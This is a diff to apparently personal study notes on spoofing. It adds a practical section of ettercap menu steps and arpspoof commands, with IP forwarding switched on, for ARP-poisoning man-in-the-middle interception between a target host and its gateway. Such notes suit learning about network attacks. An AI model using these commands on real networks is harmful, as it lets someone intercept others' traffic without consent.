@@ -38,7 +38,22 @@ English
 	-->ARP replies could come from system other than the one with the required MAC.
     -ARP Spoofing: (Spoofer)ARP Proxy with the objectif (intercept network traffic from Target)
 		   (Spoofer)An answering system with the objectif (intercept network traffic from Target)
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+[Pratique]
 
++[ettercap]
+	#sudo apt-get install ettercap-graphical
+	#sudo ettercap -G
+	#----------------Sniff->Unified Sniffing->Network Interface
+	#----------------Hosts->Scan for hosts
+	#----------------Mitm->ARP Poisoning->Sniff Remote Connections
+	#----------------Start->Start Sniffing
++[dsniff*arpspoof]
+	#sudo apt-get install dsniff
+	#sysctl net.ipv4.ip_forward
+	#sudo sysctl -w net.ipv4.ip_forward=1
+	#sudo arpspoof -t 192.168.1.x 192.168.1.1  "tell Target that I am GW"
+	#sudo arpspoof -t 192.168.1.1 192.168.1.x  "tell GW that I am Target"
 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 1.Spoof: Assume or semulate the identity of another or device in order to gain access to a system 
 	 by differents protocols ARP/DNS/IP/MAC
